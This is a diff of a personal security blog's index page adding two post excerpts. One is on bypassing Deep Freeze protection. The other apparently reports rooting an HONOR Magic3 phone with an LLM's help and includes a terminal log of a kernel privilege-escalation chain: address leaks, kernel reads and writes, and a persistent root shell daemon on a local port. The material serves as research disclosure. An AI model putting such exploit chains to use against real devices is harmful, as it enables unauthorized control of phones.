@@ -70,6 +70,120 @@
 		
             <div class="post-item">
                 <p class="post-date">
+                    2026-09-28 
+                    
+                        <a href="/tags/reverse/">
+                            #reverse
+                        </a>
+                    
+                        <a href="/tags/c/">
+                            #c
+                        </a>
+                    
+                        <a href="/tags/windows/">
+                            #windows
+                        </a>
+                    
+                </p>
+                <h2 class="post-title">
+                    <a href="/en/2026/09/28/deepfrz/">
+                        How to unlock Deep Freeze when you forget the password?
+                    </a>
+                </h2>
+                
+                    <div class="post-excerpt">
+                        <p>Eleven years ago—back when I was in the sixth grade—I managed to bypass the restore protection of Deep Freeze.</p>
+<p>Remarkably, in the eleven years since, Deep Freeze has only seen two major version updates. Recently, on a whim, I decided to test it again and found that my original method still works, while also discovering new approaches. This article covers the following two versions:</p>
+<ul>
+<li>Standard Edition: Latest version 9.0.20.5760</li>
+<li>Enterprise Edition: Second-newest version 10.10.220.5788 (Version 10.20 was released just a few days ago, but it appears to be unavailable for now)</li>
+</ul>
+<p>The method was tested on my own Windows 7 virtual machine, and both versions worked successfully. It is intended solely for personal learning and discussion.</p>
+                    </div>
+                
+                <hr class="post-hr">
+            </div>
+		
+	
+		
+            <div class="post-item">
+                <p class="post-date">
+                    2026-09-24 
+                    
+                        <a href="/tags/linux/">
+                            #linux
+                        </a>
+                    
+                        <a href="/tags/pwn/">
+                            #pwn
+                        </a>
+                    
+                        <a href="/tags/LLM/">
+                            #LLM
+                        </a>
+                    
+                        <a href="/tags/android/">
+                            #android
+                        </a>
+                    
+                </p>
+                <h2 class="post-title">
+                    <a href="/en/2026/09/24/xp3/">
+                        Sixty-four——I pwned an HONOR Magic3 using DeepSeek-V4.1-Flash
+                    </a>
+                </h2>
+                
+                    <div class="post-excerpt">
+                        <p>After giving it some thought, I've decided to place this article in the &quot;blah&quot; section, as the non-technical content makes up the greater part of the piece.</p>
+<ul>
+<li>Device: Honor ELZ-AN00 · Android 11 · build ELZ-AN00 5.0.0.189(C00E183R6P1)</li>
+<li>Kernel: 5.4.86-qgki-g33a9ed8573e1 #1 SMP PREEMPT aarch64</li>
+<li>Config: user build, locked bootloader, CFI_CLANG + LTO_CLANG + THINLTO (non-GKI)</li>
+<li>Actor: uid 2000, CapEff=0, no root helper</li>
+</ul>
+<pre><code>junyu33@zjy-asus:/mnt/c/Users/junyu33/Desktop$ bash /home/junyu33/elz-phase2/notes/artifacts/root.sh -v &quot;id&quot;
+[check] target-page sha256 = 3720fc0ef95b2c4d654c6a660b211ee00eafac2bb37d85f5697dd483673a19d4
+[chain] starting the chain (uid 2000 -&gt; uid 0), about 40 s
+=== P1: first bounded kernel write on the phone (uid 2000, no root, no GDB) ===
+[0] links: T=0xffffffc012aae588 (ashmem_misc+0x10) read_jt=0xffffffc01182ae6c write_jt=0xffffffc01182b88c open=0xffffffc0101bd7a0 rt_mutex_init_waiter=0xffffffc0103686b4 do_futex=0xffffffc0103b3f04
+[S0-ID] uid=2000 euid=2000 gid=2000 CapEff=0x0 CapPrm=0x0 Seccomp=0 NoNewPrivs=0
+[S0-ENV] uname=5.4.86-qgki-g33a9ed8573e1
+[S0-ENV] getenforce=1 domain=u:r:shell:s0 boot_id=19831966-28f0-4e7a-b177-25b40f829564
+...
+[chain] ready (uid 0 pty on 127.0.0.1:31337, adb forward active)
+--- chain summary (154 lines) ---
+  [S0-ID] uid=2000 euid=2000 gid=2000 CapEff=0x0 CapPrm=0x0 Seccomp=0 NoNewPrivs=0
+  [S0-ENV] uname=5.4.86-qgki-g33a9ed8573e1
+  [S0-ENV] getenforce=1 domain=u:r:shell:s0 boot_id=19831966-28f0-4e7a-b177-25b40f829564
+...
+  [S0-SLIDE] d=0x190 samples=28163 candidates=2 best=0x2bc3a00000 votes=27395 second=135
+  [S0-SLIDE] SLIDE=0x2bc3a00000 runtime_text=0xffffffebd3a80000 runtime_etext=0xffffffebd5240000
+  [S0-SLIDE] kernel IPs in [_text,_etext)=150000/150000
+...
+  [7B] KREAD *(V+0x10)=0xffffffebd522ae6c (==read_jt: 1) *(V+0x18)=0xffffffebd522b88c (==write_jt: 1)
+...
+  [P1C-DAEMON] RESIDENT anchor_pt=/dev/pts/0 anchor_fd=3 window_pipe=held_by_parent listening=127.0.0.1:31337 uid=0 pid=7880
+  [P1C-DAEMON] each connection forks a session child with its OWN pty+shell; this process never exits
+...
+  [CRIT] pos_uid0=1 pos_gid0=1 pos_caps=1 pos_mount0=1 neg1_mount=-1 neg2_uid=2000 init_sid=1870 count_win=1848 sid_written=1 page_ctl=0
+  [END] *(T) restored to 0xffffffebd5cba298 (== ashmem_fops+slide: 1)
+  [T] round segment = 24680 ms
+--- end summary ---
+[shell] id
+id
+:/data/local/tmp # id
+uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0:c999
+:/data/local/tmp #
+</code></pre>
+                    </div>
+                
+                <hr class="post-hr">
+            </div>
+		
+	
+		
+            <div class="post-item">
+                <p class="post-date">
                     2026-09-08 
                     
                         <a href="/tags/math/">
